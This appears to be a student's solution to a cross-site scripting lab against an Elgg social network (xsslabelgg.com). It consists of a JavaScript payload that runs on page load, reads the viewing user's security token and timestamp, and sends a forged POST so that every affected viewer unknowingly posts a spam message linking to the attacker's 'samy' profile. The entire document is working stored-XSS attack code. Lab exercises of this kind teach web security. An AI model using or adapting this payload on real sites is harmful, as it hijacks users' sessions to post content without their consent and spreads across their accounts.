<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.

        var samyID = 47;
        var ownerID = elgg.session.user.guid;            ////current user ID from elgg session data from 'view page source'

        //var sendurl=null; //FILL IN
	    //var content=null; //FILL IN

		//http://www.xsslabelgg.com/action/thewire/add
		//A POST request with this link is generated when wire posting
		//Only three parametes : __elgg_ts , __elgg_token , body

        var sendurl = "http://www.xsslabelgg.com/action/thewire/add";

        var body = "&body=To earn 12 USD/Hour(!), visit now " + "http://www.xsslabelgg.com/profile/samy";          //body is made
        //var link = "http://www.xsslabelgg.com/profile/samy"

        var content = token + ts + body;         //content carries only those 3 parameters
	
	if(samyID != ownerID)                     //Samy is not affected
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);                   //conent is passed as the body of the post request
	}
	}
</script>
